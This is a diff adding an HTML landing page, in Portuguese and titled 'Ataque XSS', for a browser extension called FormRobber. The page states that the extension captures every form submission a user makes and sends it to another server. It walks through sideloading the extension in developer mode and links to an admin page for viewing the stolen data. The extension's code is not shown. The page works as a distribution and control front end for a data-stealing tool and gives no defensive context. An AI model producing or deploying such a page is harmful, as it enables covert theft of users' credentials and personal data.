@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,user-scalable=no">
+	<meta name="robots" content="noindex,nofollow,noarchive,noodp,noydir">
+	<title>Ataque XSS</title>
+	<style type="text/css">
+		@media not all and (min-width: 300px) and (min-height: 300px){
+			#main-noscreen {
+				display: block;
+			}
+			#main {
+				display:none;
+			}
+		}
+		@media all and (min-width: 300px) and (min-height: 300px){
+			#main-noscreen {
+				display:none;
+			}
+			#main {
+				display:block;
+			}
+		}
+		body {
+			display: block;
+			margin: 0 auto;
+			background-color: rgb(210, 210, 210);
+			color: rgb(0, 0, 0);
+		}
+		#main {
+			font-size: 16px;
+			width: 90%;
+			max-width: 1500px;
+			min-width: 300px;
+			margin: 50px auto;
+			background-color: rgb(255, 255, 255);
+			border: 1px solid rgb(100, 100, 100);
+		}
+		#header {
+			display: block;
+			text-align: center;
+			font-weight: bold;
+		}
+		#body {
+			width: 100%;
+			text-align: justify;
+		}
+		#body a {
+			color: rgb(0, 0, 0);
+			text-decoration: underline;
+		}
+		#body a:hover {
+			color: rgb(0, 0, 255);
+		}
+		#main-noscreen {
+			margin: 3px;
+			color: rgb(255,0,0);
+			text-align: justify;
+		}
+	</style>
+</head>
+
+<body style="overflow: auto;">
+	<div id="main">
+		<div id="header">
+			<h1>Ataques XSS</h1>
+		</div>
+		<div id="body">
+			<p style="text-align: center;">Instale a extensão no navegador, e ela irá capturar todos os dados submetidos em formulários pelo usuário e enviar para outro servidor.</p>
+			<ul style="list-style-type: upper-roman;">
+				<li>Vá para a página de extensões do navegador em questão. No Google Chrome, esta página é a <a href="chrome://extensions/" target="_blank">chrome://extensions/</a> e no Opera é <a href="opera://extensions/" target="_blank">opera://extensions/</a>.</li>
+				<li>Ative o Modo de Desenvolvedor. Geralmente essa opção fica na barra de ferramentas desta página.</li>
+				<li><a href="FormRobber.zip">Baixe a extensão em *zip</a> e adicione no navegador. Para adicionar, no explorador de arquivos encontre o *.zip baixado e arraste-o para a página de extensões de seu navegador com o Modo de Desenvolvedor ativado.</li>
+				<li>Ative a extensão caso ela não seja ativada automaticamente.</li>
+				<li>A extensão já está funcionando nesse navegador! Talvez seja necessário atualizar as abas abertas no momento de instalação para que ela entre em vigor.</li>
+			</ul>
+			<p style="text-align: center;">Caso tenha interesse em ver o que a extensão de navegador já capturou de dados, acesse a <a href="admin.php">área de administrador</a>.</p>
+		</div>
+	<div id="main-noscreen">
+		<span>Sua tela é muito pequena para visualizar esta página da web.</span>
+	</div>
+</body>
+
+</html>
+
